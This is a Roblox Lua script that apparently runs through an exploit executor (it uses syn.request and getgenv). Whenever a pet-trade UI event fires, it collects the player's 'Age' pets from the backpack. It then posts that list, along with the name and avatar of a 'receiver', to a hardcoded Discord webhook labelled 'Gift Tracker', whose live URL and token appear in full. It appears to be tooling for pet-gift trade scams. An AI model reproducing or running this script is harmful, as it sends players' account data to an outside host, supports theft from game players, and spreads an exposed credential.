local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local RefreshActivePetsUI = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("RefreshActivePetsUI")

local webhookUrl = "https://discord.com/api/webhooks/1382940281720274994/Y8dgCc4iUj_znxUJDNetJ7GSxeMywuXYaaVWHIOeiDz6uPj6jvHd7DV49FrbNni-OkW-"
local req = (syn and syn.request) or http_request or request

-- Helper: Get only Age pets
local function getAgeInventory(player)
	local backpack = player:FindFirstChild("Backpack")
	local inventory = {}
	if backpack then
		for _, tool in ipairs(backpack:GetChildren()) do
			if tool:IsA("Tool") and tool.Name:find("Age") then
				table.insert(inventory, tool.Name)
			end
		end
	end
	return inventory
end

-- Format inventory nicely
local function formatInventory(inv)
	local counts = {}
	for _, name in ipairs(inv) do
		local base = name:match("^(.-) %[[^%]]+%] %[[^%]]+%]$") or name
		counts[base] = (counts[base] or 0) + 1
	end

	local lines = {
		"```",
		string.format("%-15s| %s", "Pet", "Count"),
		string.rep("-", 15) .. "|------"
	}
	for name, count in pairs(counts) do
		table.insert(lines, string.format("%-15s| %d", name, count))
	end
	table.insert(lines, "```")

	return #lines > 3 and table.concat(lines, "\n") or "_None_"
end

-- Send webhook when triggered
local function sendWebhook(inv)
	local receiver = getgenv().receiver
	local receiverPlayer

	-- Resolve receiver if it's a string or Player instance
	if typeof(receiver) == "Instance" and receiver:IsA("Player") then
		receiverPlayer = receiver
	elseif typeof(receiver) == "string" then
		receiverPlayer = Players:FindFirstChild(receiver)
	end

	local displayName = receiverPlayer and receiverPlayer.DisplayName or "Unknown"
	local userId = receiverPlayer and receiverPlayer.UserId or 1

	local embed = {
		{
			title = "🎁 Trade Success!",
			description = "**" .. displayName .. "** has accepted a pet gift!",
			color = 16753920,
			fields = {
				{
					name = "🎒 Current Backpack",
					value = formatInventory(inv)
				}
			},
			thumbnail = {
				url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. tostring(userId) .. "&size=420x420&format=Png&isCircular=true"
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
			footer = {
				text = "Gift Tracker"
			}
		}
	}

	local payload = HttpService:JSONEncode({
		username = "Lei",
		embeds = embed
	})

	if typeof(req) == "function" then
		req({
			Url = webhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = payload
		})
	end
end

-- Listen for acceptance trigger
RefreshActivePetsUI.OnClientEvent:Connect(function()
	local inv = getAgeInventory(LocalPlayer)
	sendWebhook(inv)
end)
